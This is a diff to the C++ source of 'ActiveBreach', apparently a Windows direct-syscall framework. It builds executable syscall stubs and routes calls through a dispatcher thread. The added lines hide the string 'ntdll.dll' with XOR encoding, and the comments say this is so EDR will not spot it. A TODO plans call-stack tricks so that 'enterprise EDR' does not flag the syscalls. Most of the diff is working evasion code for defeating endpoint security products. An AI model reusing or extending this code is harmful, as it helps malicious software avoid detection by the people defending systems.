@@ -39,17 +39,25 @@
 #include <cstring>
 #include <cstdarg>
 
+
 namespace {
 
-    NTSTATUS _fatal_err(const char* msg) {
+    [[noreturn]] void _fatal_err(const char* msg) {
         std::cerr << msg << std::endl;
-        return STATUS_UNSUCCESSFUL;
+        exit(1);
     }
 
     void _Zero(void* buffer, size_t size) {
         SecureZeroMemory(buffer, size);
         VirtualFree(buffer, 0, MEM_RELEASE);
     }
+
+    #define XOR_KEY 0x5A
+
+    // ntdll.dll, if plaintext then EDR will pick up it
+    static const wchar_t enc[] = {
+        0x0036, 0x0036, 0x003E, 0x0074, 0x0036, 0x0036, 0x003E, 0x002E, 0x0034
+    };
 
     void _decode(wchar_t* decoded, size_t size) {
         for (size_t i = 0; i < size; i++) {
@@ -70,7 +78,8 @@ namespace {
         if (swprintf(path, MAX_PATH, L"%s\\%s", system_dir, decoded) < 0)
             _fatal_err("Failed to build path");
 
-        HANDLE file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        HANDLE file = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
+            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (file == INVALID_HANDLE_VALUE)
             _fatal_err("Failed to open file");
 
@@ -89,7 +98,6 @@ namespace {
         CloseHandle(file);
 
         *out_size = file_size;
-
         return buffer;
     }
 
@@ -143,19 +151,32 @@ namespace {
         }
 
         void _BuildStubs(const std::unordered_map<std::string, uint32_t>& syscall_table) {
-            _stub_mem_size = syscall_table.size() * 16; // Each stub is 16 bytes
+            _stub_mem_size = syscall_table.size() * 16;
             _stub_mem = static_cast<uint8_t*>(VirtualAlloc(nullptr, _stub_mem_size,
                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
 
-            if (!_stub_mem)
+            if (!_stub_mem) {
                 throw std::runtime_error("Failed to allocate executable memory for stubs");
+            }
 
             uint8_t* current_stub = _stub_mem;
+
+#if __cplusplus >= 202002L
             for (const auto& [name, ssn] : syscall_table) {
                 _CreateStub(current_stub, ssn);
                 _syscall_stubs[name] = current_stub;
                 current_stub += 16;
             }
+#else
+            for (const auto& entry : syscall_table) {
+                const std::string& name = entry.first;
+                uint32_t ssn = entry.second;
+
+                _CreateStub(current_stub, ssn);
+                _syscall_stubs[name] = current_stub;
+                current_stub += 16;
+            }
+#endif
         }
 
         void* _GetStub(const std::string& name) const {
@@ -163,14 +184,11 @@ namespace {
             return (it != _syscall_stubs.end()) ? it->second : nullptr;
         }
 
-
-        // ---------------------------------------------------------------------------------------------------------
-        // TODO:
-        // - Switch to a on-demand based creation model (no static stubs)
-        // - Call syscall prologues in ntdll.dll with our args
-        //  Some enterprise EDR would check the callstack, syscall not originating from ntdll.dll would be flagged
-        // ---------------------------------------------------------------------------------------------------------
-
+    /* TODO:
+    * - Switch to a on-demand based creation model (no static stubs)
+    * - Call syscall prologues in ntdll.dll with our args
+    *   Some enterprise EDR would check the callstack, syscall not originating from ntdll.dll would be flagged
+     */  
     private:
         void _CreateStub(void* target_address, uint32_t ssn) {
             // Stub layout (16 bytes):
@@ -197,10 +215,11 @@ namespace {
 
     //------------------------------------------------------------------------------
     // Dispatcher Globals and Structures
-    // All stubs are assumed to have signature:
-    // ULONG_PTR NTAPI Fn(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
     //------------------------------------------------------------------------------
 
+    // All stubs are assumed to have signature:
+    // ULONG_PTR NTAPI Fn(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
+    //                     ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
     typedef ULONG_PTR(NTAPI* _ABStubFn)(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR,
         ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR);
 
@@ -220,19 +239,14 @@ namespace {
 
 #define DISPATCH_CALL(n, ...) case n: ret = fn(__VA_ARGS__); break;
 
-
-    //------------------------------------------------------------------------------
-    // Dispatcher Thread Function
-    //------------------------------------------------------------------------------
+//------------------------------------------------------------------------------
+// Dispatcher Thread Function
+//------------------------------------------------------------------------------
 
     DWORD WINAPI _ActiveBreach_Dispatcher(LPVOID /*lpParameter*/) {
         if (!_g_abCallEvent)
             _fatal_err("Dispatcher event not created");
-
         for (;;) {
-            if (_g_abCallEvent == NULL)
-                _fatal_err("Invalid dispatcher event handle");
-
             WaitForSingleObject(_g_abCallEvent, INFINITE);
 
             EnterCriticalSection(&_g_abCallCS);
@@ -260,10 +274,7 @@ namespace {
             _g_abCallRequest.ret = ret;
             LeaveCriticalSection(&_g_abCallCS);
 
-            if (req.complete)
-                SetEvent(req.complete);
-            else
-                _fatal_err("Invalid completion event handle");
+            SetEvent(req.complete);
         }
 
         return 0; // Never reached
@@ -284,7 +295,6 @@ namespace {
         return 0;
     }
 
-
     //------------------------------------------------------------------------------
     // Callback Implementation
     //------------------------------------------------------------------------------
@@ -299,7 +309,6 @@ namespace {
         if (current_ret_addr != state.ret_addr) { RaiseException(ACTIVEBREACH_SYSCALL_RETURNMODIFIED, 0, 0, nullptr); }
         if (elapsed > SYSCALL_TIME_THRESHOLD) { RaiseException(ACTIVEBREACH_SYSCALL_LONGSYSCALL, 0, 0, nullptr); }
     }
-
 
     //------------------------------------------------------------------------------
     // ActiveBreach call Implementation
@@ -340,9 +349,7 @@ namespace {
         EnterCriticalSection(&_g_abCallCS);
         ULONG_PTR ret = _g_abCallRequest.ret;
         LeaveCriticalSection(&_g_abCallCS);
-
-        if (req.complete)
-            CloseHandle(req.complete);
+        CloseHandle(req.complete);
 
         ActiveBreach_Callback(execState);
 
@@ -355,9 +362,7 @@ namespace {
 // Exports
 //------------------------------------------------------------------------------
 
-extern "C" void ActiveBreach_launch() {
-    ActiveBreach_Initialized = true;
-
+extern "C" void ActiveBreach_launch(const char* notify) {
     try {
         size_t ab_handle_size = 0;
 
@@ -380,6 +385,9 @@ extern "C" void ActiveBreach_launch() {
         CloseHandle(_g_abInitializedEvent);
         _g_abInitializedEvent = nullptr;
         CloseHandle(hThread);
+
+        if (notify && std::strcmp(notify, "LMK") == 0)
+            std::cout << "[AB] ACTIVEBREACH OPERATIONAL" << std::endl;
     }
     catch (const std::exception& e) {
         std::cerr << "ActiveBreach_launch err: " << e.what() << std::endl;
@@ -387,21 +395,8 @@ extern "C" void ActiveBreach_launch() {
     }
 }
 
-NTSTATUS NTAPI DefaultStub(ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR, ULONG_PTR) {
-    return STATUS_UNSUCCESSFUL;
-}
-
-// Program would crash if activebreach was NOT initalized bc of returning a nullptr
-// Caused cfg hell, fixed by returning a safe ptr
 extern "C" void* _ab_get_stub(const char* name) {
     if (!name)
-        return reinterpret_cast<void*>(&DefaultStub);
-
-    void* stub = _g_ab_internal._GetStub(name);
-    if (!stub) {
-        fprintf(stderr, "Stub \"%s\" not found\n", name);
-        return reinterpret_cast<void*>(&DefaultStub);
-    }
-
-    return stub;
+        return nullptr;
+    return _g_ab_internal._GetStub(name);
 }
